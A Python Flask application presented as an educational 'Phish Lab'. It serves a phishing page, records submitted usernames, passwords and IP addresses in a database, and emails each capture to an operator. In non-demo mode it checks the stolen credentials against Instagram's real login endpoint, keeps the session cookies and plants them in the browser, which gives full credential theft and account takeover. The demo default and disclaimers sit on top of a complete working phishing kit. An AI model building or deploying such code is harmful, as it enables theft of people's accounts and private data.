from flask import Flask, request, jsonify, session, redirect
import sqlite3
import datetime as dt
import os
import time
import requests
import json
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from functools import wraps

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'render_fix_2026_v3')

# 🔧 RENDER-SPECIFIC CONFIG
IS_RENDER = os.getenv('RENDER', 'false').lower() == 'true'  # Render sets this automatically
DB_FILE = '/tmp/pentest_captures.db' if IS_RENDER else 'pentest_captures.db'  # Use /tmp on Render

# 📧 EMAIL CONFIG - SET IN RENDER DASHBOARD
EMAIL_ENABLED = os.getenv('EMAIL_ENABLED', 'true').lower() == 'true'
EMAIL_USER = os.getenv('EMAIL_USER', '')
EMAIL_PASS = os.getenv('EMAIL_PASS', '')
TARGET_EMAIL = os.getenv('TARGET_EMAIL', '')
SMTP_SERVER = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.getenv('SMTP_PORT', '587'))

# 🤖 INSTAGRAM CONFIG - DEMO MODE FOR RENDER
DEMO_MODE = os.getenv('DEMO_MODE', 'true').lower() == 'true'  # Use demo validation instead of real Instagram
DEMO_VALID_ACCOUNTS = {
    'demo_user': 'demo_password',
    'test': 'test123',
    'admin': 'admin123'
}

# 🗄️ DATABASE INIT
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT, username TEXT, password TEXT,
                  ip TEXT, ua TEXT, status TEXT DEFAULT 'checking',
                  cookies TEXT DEFAULT '{}', emailed INTEGER DEFAULT 0,
                  session_ready TEXT DEFAULT 'no',
                  platform TEXT DEFAULT 'demo')''')
    conn.commit()
    conn.close()
    print(f"✅ Database initialized: {DB_FILE}")
    print(f"📁 Database path: {os.path.abspath(DB_FILE)}")

init_db()

# 📧 EMAIL FUNCTION - RENDER COMPATIBLE
def send_email_secure(subject, body, is_html=False):
    """Email function optimized for Render with fallbacks"""
    if not EMAIL_ENABLED or not EMAIL_USER or not EMAIL_PASS:
        print("📧 Email disabled or credentials missing")
        return False
    
    # Log email attempt (for debugging on Render)
    print(f"📧 Attempting to send email to {TARGET_EMAIL}")
    
    try:
        msg = MIMEMultipart('alternative')
        msg['From'] = EMAIL_USER
        msg['To'] = TARGET_EMAIL
        msg['Subject'] = subject
        
        if is_html:
            msg.attach(MIMEText(body, 'html'))
        else:
            msg.attach(MIMEText(body, 'plain'))
        
        # Try different SMTP configurations
        try:
            # Method 1: Standard TLS
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=15)
            server.starttls()
            server.login(EMAIL_USER, EMAIL_PASS)
            server.send_message(msg)
            server.quit()
            print("✅ Email sent successfully (TLS)")
            return True
        except Exception as e1:
            print(f"⚠️ TLS failed: {e1}")
            
            # Method 2: SSL (if TLS fails)
            try:
                server = smtplib.SMTP_SSL(SMTP_SERVER, 465, timeout=15)
                server.login(EMAIL_USER, EMAIL_PASS)
                server.send_message(msg)
                server.quit()
                print("✅ Email sent successfully (SSL)")
                return True
            except Exception as e2:
                print(f"❌ SSL failed: {e2}")
                return False
                
    except Exception as e:
        print(f"❌ Email error: {e}")
        return False

def send_capture_email(capture_id, username, password, ip, ua, status="🎣 NEW CAPTURE"):
    """Send capture notification with Render compatibility"""
    if not EMAIL_ENABLED:
        return False
    
    timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    subject = f"🎣 Phish Lab - {status} - #{capture_id}"
    
    # Simple text email (more reliable)
    plain_body = f"""
🔐 PHISH LAB CAPTURE #{capture_id}
Timestamp: {timestamp}
Status: {status}

👤 Username: {username}
🔑 Password: {password}

🌐 IP: {ip}
📱 Platform: {'DEMO MODE' if DEMO_MODE else 'REAL INSTAGRAM'}
📍 Server: {'Render' if IS_RENDER else 'Local'}

📊 Dashboard: {request.host_url}data_captured
🕵️ Admin: {request.host_url}admin

---
Educational Purposes Only - Demo Account
"""
    
    return send_email_secure(subject, plain_body, is_html=False)

# 🤖 INSTAGRAM VERIFICATION - RENDER-COMPATIBLE
def verify_instagram_credentials(username, password):
    """Verify credentials with Instagram (or demo mode)"""
    
    if DEMO_MODE:
        # DEMO MODE: Check against demo accounts (works on Render)
        print(f"🤖 DEMO MODE: Verifying {username}")
        
        if username in DEMO_VALID_ACCOUNTS and DEMO_VALID_ACCOUNTS[username] == password:
            print(f"✅ DEMO SUCCESS: {username}")
            # Generate mock cookies for demo
            mock_cookies = {
                'sessionid': f'demo_session_{int(time.time())}',
                'ds_user_id': '123456789',
                'ig_did': 'DEMO_ACCOUNT_ID'
            }
            return True, mock_cookies, 'demo'
        else:
            print(f"❌ DEMO FAILED: {username}")
            return False, {}, 'demo'
    
    else:
        # REAL MODE: Try Instagram API (likely blocked on Render)
        print(f"🤖 REAL MODE: Attempting Instagram login for {username}")
        
        session = requests.Session()
        try:
            # Enhanced headers to look more like a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
            }
            
            # Get login page
            session.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=15)
            
            # Try login with longer timeout
            timestamp = str(int(time.time()))
            enc_pass = f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}'
            
            login_data = {
                'username': username,
                'enc_password': enc_pass,
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            # Additional headers for AJAX request
            login_headers = headers.copy()
            login_headers.update({
                'X-Requested-With': 'XMLHttpRequest',
                'X-IG-App-ID': '936619743392459',
                'X-CSRFToken': session.cookies.get('csrftoken', ''),
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Content-Type': 'application/x-www-form-urlencoded',
            })
            
            response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=login_headers,
                timeout=20
            )
            
            if response.status_code == 200:
                result = response.json()
                authenticated = result.get('authenticated', False)
                
                if authenticated:
                    print(f"✅ REAL SUCCESS: {username}")
                    return True, dict(session.cookies), 'real'
                else:
                    print(f"❌ REAL FAILED: {username}")
                    return False, {}, 'real'
            else:
                print(f"⚠️ Instagram API error: {response.status_code}")
                return False, {}, 'error'
                
        except Exception as e:
            print(f"❌ Instagram verification error: {e}")
            return False, {}, 'error'

# 🔐 ADMIN AUTH
def require_admin(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect('/admin')
        return f(*args, **kwargs)
    return decorated_function

# 📱 PHISH PAGE
@app.route('/')
def phish_page():
    # Serve your index.html
    with open('index.html', 'r', encoding='utf-8') as f:
        return f.read()

# 🎣 CAPTURE ENDPOINT
@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)  # Render proxy
    ua = request.headers.get('User-Agent', '')[:250]
    
    if not username or not password:
        return jsonify({'error': 'Missing credentials'}), 400
    
    # Save to database
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    timestamp = dt.datetime.now().isoformat()
    c.execute('''INSERT INTO captures (timestamp, username, password, ip, ua) 
                 VALUES (?, ?, ?, ?, ?)''', 
              (timestamp, username, password, ip, ua))
    capture_id = c.lastrowid
    conn.commit()
    
    # Send initial email
    if EMAIL_ENABLED:
        email_thread = threading.Thread(
            target=send_capture_email,
            args=(capture_id, username, password, ip, ua, "🎣 NEW CAPTURE"),
            daemon=True
        )
        email_thread.start()
    
    # Start verification in background
    def verify_background():
        try:
            success, cookies, platform = verify_instagram_credentials(username, password)
            status = '✅ SUCCESS' if success else '❌ FAILED'
            cookies_json = json.dumps(cookies) if success else '{}'
            session_ready = 'yes' if success else 'no'
            
            # Update database
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute('''UPDATE captures 
                        SET status=?, cookies=?, session_ready=?, platform=?, emailed=1 
                        WHERE id=?''',
                     (status, cookies_json, session_ready, platform, capture_id))
            conn.commit()
            conn.close()
            
            print(f"🤖 Verification #{capture_id}: {status}")
            
            # Send result email
            if EMAIL_ENABLED:
                send_capture_email(
                    capture_id, username, password, ip, ua,
                    f"{status} - {'VALID' if success else 'INVALID'}"
                )
                
        except Exception as e:
            print(f"❌ Verification error #{capture_id}: {e}")
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("UPDATE captures SET status='❌ ERROR' WHERE id=?", (capture_id,))
            conn.commit()
            conn.close()
    
    threading.Thread(target=verify_background, daemon=True).start()
    
    conn.close()
    return jsonify({'wait_id': capture_id})

# 📊 STATUS CHECK
@app.route('/status/<int:capture_id>')
def status_check(capture_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT status FROM captures WHERE id=?", (capture_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({'ready': False, 'error': 'Not found'})
    
    status = row[0]
    ready = status != 'checking' and status is not None
    
    # In demo mode, all demo accounts are "successful"
    if DEMO_MODE and ready and '❌ FAILED' in status:
        # Check if it's a demo account
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT username FROM captures WHERE id=?", (capture_id,))
        user_row = c.fetchone()
        conn.close()
        
        if user_row and user_row[0] in DEMO_VALID_ACCOUNTS:
            return jsonify({
                'ready': True,
                'success': False,  # Still false for failed demo accounts
                'status': status,
                'demo_mode': True
            })
    
    return jsonify({
        'ready': ready,
        'success': '✅ SUCCESS' in status if ready else False,
        'status': status,
        'demo_mode': DEMO_MODE
    })

# 🌐 REDIRECT
@app.route('/home/<int:capture_id>')
def real_home(capture_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT cookies, username, status, platform FROM captures WHERE id=?", (capture_id,))
    row = c.fetchone()
    conn.close()
    
    if row and row[2] == '✅ SUCCESS':
        cookies = json.loads(row[0]) if row[0] else {}
        username = row[1]
        platform = row[3]
        
        if DEMO_MODE and platform == 'demo':
            # DEMO MODE: Show success page but don't redirect to real Instagram
            return f'''
<!DOCTYPE html>
<html>
<head>
    <title>✅ Demo Successful</title>
    <style>
        body {{
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            text-align: center;
            padding: 100px 20px;
        }}
        .container {{
            max-width: 400px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .success {{
            color: #28a745;
            font-size: 48px;
            margin-bottom: 20px;
        }}
        .demo-badge {{
            background: #6c757d;
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 12px;
            margin-left: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="success">✓</div>
        <h2>✅ Demo Successful!</h2>
        <p>Username: <strong>{username}</strong> <span class="demo-badge">DEMO</span></p>
        <p>In a real phishing scenario, you would now be redirected to Instagram.</p>
        <p>This demo shows how attackers can steal credentials.</p>
        <br>
        <a href="/" style="color: #0095f6;">← Back to login page</a>
        <br><br>
        <small style="color: #666;">Educational demo only. No real Instagram login occurred.</small>
    </div>
</body>
</html>'''
        else:
            # REAL MODE: Redirect to Instagram
            cookie_script = ""
            for key, value in cookies.items():
                cookie_script += f'document.cookie = "{key}={value}; domain=.instagram.com; path=/";\n'
            
            return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <style>
        body {{
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            text-align: center;
            padding: 100px 20px;
        }}
        .spinner {{
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <h2>✅ Success! Redirecting to Instagram...</h2>
    <div class="spinner"></div>
    <script>
        {cookie_script}
        setTimeout(() => {{
            window.location.href = "https://www.instagram.com/";
        }}, 2000);
    </script>
</body>
</html>'''
    
    # Invalid or not ready
    return redirect('/')

# 🔐 ADMIN PANELS (keep your existing admin routes)
@app.route('/admin')
def admin_login():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>🔐 Admin Login</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            width: 350px;
        }
        h2 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🔐 Phish Lab Admin</h2>
        <form method="POST" action="/admin/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 14px;">
            Default: admin / admin123
        </div>
    </div>
</body>
</html>'''

@app.route('/admin/login', methods=['POST'])
def admin_login_post():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    if username == 'admin' and password == 'admin123':
        session['admin_logged_in'] = True
        return redirect('/data_captured')
    
    return '''
    <script>
        alert("Invalid credentials!");
        window.location.href = "/admin";
    </script>'''

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect('/admin')

@app.route('/data_captured')
@require_admin
def dashboard():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM captures ORDER BY id DESC LIMIT 50")
    rows = c.fetchall()
    conn.close()
    
    rows_html = ''
    for row in rows:
        status = row[6] or 'checking'
        status_class = 'success' if '✅ SUCCESS' in status else 'failed' if '❌ FAILED' in status else 'checking'
        emailed = '📧' if row[8] else '📪'
        platform = row[10] if len(row) > 10 else 'unknown'
        
        rows_html += f'''
        <tr>
            <td>{row[0]}</td>
            <td>{row[1][:19]}</td>
            <td>{row[2]}</td>
            <td><code>{row[3]}</code></td>
            <td>{row[4]}</td>
            <td class="{status_class}">{status}</td>
            <td>{emailed}</td>
            <td>{platform}</td>
        </tr>'''
    
    # Environment info
    env_info = f"""
    <div style="background:#222;padding:15px;border-radius:5px;margin:20px 0;">
        <strong>Environment Info:</strong><br>
        • Render: {'✅ Yes' if IS_RENDER else '❌ No'}<br>
        • Demo Mode: {'✅ Enabled' if DEMO_MODE else '❌ Disabled'}<br>
        • Email: {'✅ Enabled' if EMAIL_ENABLED else '❌ Disabled'}<br>
        • Database: {DB_FILE}<br>
        • Demo Accounts: {', '.join(DEMO_VALID_ACCOUNTS.keys())}
    </div>
    """
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <title>📊 Phish Lab Dashboard</title>
    <style>
        body {{
            background: #111;
            color: #fff;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }}
        .header {{
            background: linear-gradient(45deg, #f09433, #bc1888);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }}
        th, td {{
            border: 1px solid #333;
            padding: 10px;
            text-align: left;
        }}
        th {{
            background: #222;
            color: #0ff;
        }}
        .success {{ color: #0f0; }}
        .failed {{ color: #f00; }}
        .checking {{ color: #ff0; }}
        .nav a {{
            color: #0ff;
            text-decoration: none;
            padding: 10px 20px;
            border: 1px solid #0ff;
            border-radius: 5px;
            margin-right: 10px;
        }}
        .nav a:hover {{
            background: #0ff;
            color: #000;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🎣 Phish Lab Dashboard</h1>
        <p>Render-Compatible Educational Tool</p>
    </div>
    
    <div class="nav">
        <a href="/">← Phishing Page</a>
        <a href="/admin/logout">Logout 🔐</a>
    </div>
    
    {env_info}
    
    <h2>📋 Recent Captures</h2>
    <table>
        <tr>
            <th>ID</th><th>Time</th><th>Username</th><th>Password</th><th>IP</th><th>Status</th><th>Emailed</th><th>Platform</th>
        </tr>
        {rows_html}
    </table>
</body>
</html>'''

# 🚀 STARTUP MESSAGE
print("\n" + "="*60)
print("🔥 PHISH LAB - RENDER COMPATIBLE VERSION")
print("="*60)
print(f"🌐 Running on: {'Render' if IS_RENDER else 'Local'}")
print(f"🤖 Demo Mode: {'✅ ENABLED' if DEMO_MODE else '❌ DISABLED'}")
print(f"📧 Email: {'✅ ENABLED' if EMAIL_ENABLED else '❌ DISABLED'}")
print(f"💾 Database: {DB_FILE}")
print(f"📂 Database exists: {os.path.exists(DB_FILE)}")
print("="*60)
print("✅ Demo Accounts (always valid):")
for user, passwd in DEMO_VALID_ACCOUNTS.items():
    print(f"   👤 {user} : {passwd}")
print("="*60)
print("⚠️  EDUCATIONAL USE ONLY - DEMO ACCOUNTS ONLY")
print("="*60 + "\n")

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)  # debug=False for production